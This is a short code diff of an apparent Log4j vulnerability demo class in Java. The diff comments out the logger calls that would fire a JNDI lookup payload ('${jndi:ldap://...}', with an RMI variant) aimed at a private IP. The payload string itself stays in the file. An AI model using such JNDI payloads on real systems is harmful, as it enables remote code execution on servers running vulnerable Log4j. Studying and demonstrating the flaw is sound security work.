@@ -1,8 +1,8 @@
 package com.winson.opensource.logger;
 
 
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
+//import org.apache.logging.log4j.LogManager;
+//import org.apache.logging.log4j.Logger;
 
 import javax.naming.NamingException;
 
@@ -12,7 +12,7 @@ import javax.naming.NamingException;
  **/
 public class Log4JBugDemo {
 
-    private static Logger logger= LogManager.getLogger(Log4JBugDemo.class.getName());
+//    private static Logger logger= LogManager.getLogger(Log4JBugDemo.class.getName());
 
     public static void main(String[] args) throws NamingException {
 //        try {
@@ -27,9 +27,9 @@ public class Log4JBugDemo {
 
         String target = "${jndi:ldap://172.16.2.113:1389/d0c7la}";
 //        String target = "${jndi:rmi://172.16.2.113:1389/d0c7la}";
-        logger.error("test log4j bug ... 1");
-        logger.error("params : {}" , target);
-        logger.error("test log4j bug ... 3");
+//        logger.error("test log4j bug ... 1");
+//        logger.error("params : {}" , target);
+//        logger.error("test log4j bug ... 3");
 
     }
 
